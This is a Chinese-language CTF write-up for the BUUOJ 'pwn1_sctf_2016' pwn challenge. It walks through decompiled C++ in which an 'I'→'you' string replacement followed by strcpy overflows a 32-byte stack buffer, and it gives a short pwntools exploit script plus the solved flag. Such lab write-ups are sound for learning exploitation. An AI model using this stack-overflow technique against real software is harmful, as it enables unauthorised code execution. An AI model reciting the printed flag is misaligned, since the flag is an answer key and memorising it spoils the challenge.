# pwn1_sctf_2016

[题目地址](https://buuoj.cn/challenges#pwn1_sctf_2016)

不会c++就只能连1级题都懵逼了ಠ_ಠ。

程序的主要函数内容不多，就是看起来有点难受。

```c++
void vuln(void)

{
  char *__src;
  char input [32];
  basic_string local_20;
  basic_string<char,std::char_traits<char>,std::allocator<char>> you [7];
  allocator<char> local_15;
  basic_string<char,std::char_traits<char>,std::allocator<char>> I [7];
  allocator<char> local_d [5];
  
  printf("Tell me something about yourself: ");
  fgets(input,32,stdin);
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&::input,input);
  std::allocator<char>::allocator();
                    /* try { // try from 08049211 to 08049215 has its CatchHandler @ 08049311 */
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
            ((char *)you,(allocator *)&DAT_08049823);
  std::allocator<char>::allocator();
                    /* try { // try from 08049236 to 0804923a has its CatchHandler @ 080492f7 */
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
            ((char *)I,(allocator *)&DAT_08049827);
                    /* try { // try from 08049257 to 0804925b has its CatchHandler @ 080492e8 */
  replace(&local_20,&::input,I,you);
                    /* try { // try from 0804926d to 08049271 has its CatchHandler @ 080492d9 */
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&::input,&local_20);
                    /* try { // try from 08049278 to 0804927c has its CatchHandler @ 080492e8 */
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_20);
                    /* try { // try from 08049283 to 08049287 has its CatchHandler @ 080492f7 */
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(I);
  std::allocator<char>::~allocator(local_d);
                    /* try { // try from 08049299 to 0804929d has its CatchHandler @ 08049311 */
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(you);
  std::allocator<char>::~allocator(&local_15);
  __src = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str();
  strcpy(input,__src);
  printf("So, %s\n",input);
  return;
}
```

查了一些资料。[basic_string](https://learn.microsoft.com/zh-cn/cpp/standard-library/basic-string-class?view=msvc-170)类如其名，标准c++字符串类。[replace](https://blog.csdn.net/haha294182852/article/details/77567437)是字符串替换函数，虽然这道题里的replace用法和正常的c++的replace函数有些不一样，不过功能差不多。[c_str](https://blog.csdn.net/JIEJINQUANIL/article/details/51547027)函数返回一个指向正规C字符串的指针常量，内容与原本string串相同。这个函数是为了和c语言兼容，有一个要注意的地方：一定要使用strcpy()等函数来操作c_str()返回的指针，这也就解释了下一行strcpy(input,__src);的作用。

分析函数，fgets读取输入，正好32个，没有溢出。接下来的replace函数很复杂，但是结合c++原本replace函数的设计，猜测是把input中出现I的所有地方都替换成you，结果存在local_20里。真的就是猜，我也不知道对不对，因为下面有好几行我都看不出来作用。只能看出来最后来了个c_str，谁调用的也看不出来。继续猜，既然前面替换了，这替换肯定是有意义的。最后把__src重新复制到input里。（ida里是看得出来的）这题只有1级，最简单的想法是把替换后的字符串重新放入input中，那就可以栈溢出了。input距离返回地址有0x40个字节,我们先输入20个I，然后4个任意字符，然后返回地址，这样替换时20个I变为总长60字符的you，加上4个字符，64个正好溢出到返回地址。

```python
from pwn import *
p=remote("node4.buuoj.cn",26534)
payload=b'I'*20+b'a'*4+p32(0x08048f0d)
p.sendline(payload)
p.interactive()
```

### Flag
- flag{ac55d95e-a804-4340-8bd6-c5019a73b465}